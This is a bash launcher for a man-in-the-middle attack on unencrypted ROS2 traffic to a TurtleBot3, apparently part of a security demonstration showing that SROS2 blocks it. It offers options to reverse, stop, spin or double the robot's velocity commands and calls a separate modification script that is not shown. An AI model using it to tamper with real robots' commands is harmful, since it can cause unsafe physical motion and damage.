#!/bin/bash
# Launch complete MITM attack
# Runs message modification script on MITM router

echo "=========================================="
echo "MITM Attack Launcher"
echo "=========================================="
echo ""

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
MITM_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"

# Setup ROS2 environment
if [ -z "$ROS_DISTRO" ]; then
    source /opt/ros/jazzy/setup.bash 2>/dev/null || source /opt/ros/humble/setup.bash 2>/dev/null
fi
export TURTLEBOT3_MODEL=burger

echo "This script launches MITM message modification attack."
echo ""
echo "⚠️  WARNING: This will modify ROS2 messages!"
echo "   Only works with unencrypted ROS2 (default)"
echo "   Will be blocked by SROS2 (encrypted)"
echo ""

# Attack type selection
echo "Select modification type:"
echo "  1) Reverse - Reverse all commands (forward -> backward)"
echo "  2) Stop - Stop robot (set all to zero)"
echo "  3) Spin - Force robot to spin"
echo "  4) Amplify - Amplify commands (2x speed)"
echo "  5) Intercept only - Just log, don't modify"
echo ""

read -p "Enter choice [1-5]: " attack_choice

case $attack_choice in
    1)
        MOD_TYPE="reverse"
        MOD_DESC="Reverse commands"
        ;;
    2)
        MOD_TYPE="stop"
        MOD_DESC="Stop robot"
        ;;
    3)
        MOD_TYPE="spin"
        MOD_DESC="Force spin"
        ;;
    4)
        MOD_TYPE="amplify"
        MOD_DESC="Amplify commands"
        ;;
    5)
        MOD_TYPE="none"
        MOD_DESC="Intercept only"
        ;;
    *)
        MOD_TYPE="reverse"
        MOD_DESC="Reverse commands (default)"
        ;;
esac

echo ""
echo "Attack Configuration:"
echo "  Type: $MOD_DESC"
echo ""

read -p "Confirm and launch attack? [y/N]: " confirm
if [ "$confirm" != "y" ]; then
    echo "Attack cancelled"
    exit 0
fi

echo ""
echo "=========================================="
echo "Launching MITM Attack!"
echo "=========================================="
echo ""

# Launch message modifier
if [ "$MOD_TYPE" = "none" ]; then
    python3 "$SCRIPT_DIR/modify_ros2_messages.py"
else
    python3 "$SCRIPT_DIR/modify_ros2_messages.py" "$MOD_TYPE"
fi

ATTACK_EXIT_CODE=$?

echo ""
echo "=========================================="
if [ $ATTACK_EXIT_CODE -eq 0 ]; then
    echo "Attack Completed!"
else
    echo "Attack Failed (exit code: $ATTACK_EXIT_CODE)"
    echo ""
    echo "Possible reasons:"
    echo "  - SROS2 is enabled (messages are encrypted)"
    echo "  - No /cmd_vel traffic to intercept"
    echo "  - ROS2 communication issue"
fi
echo "=========================================="

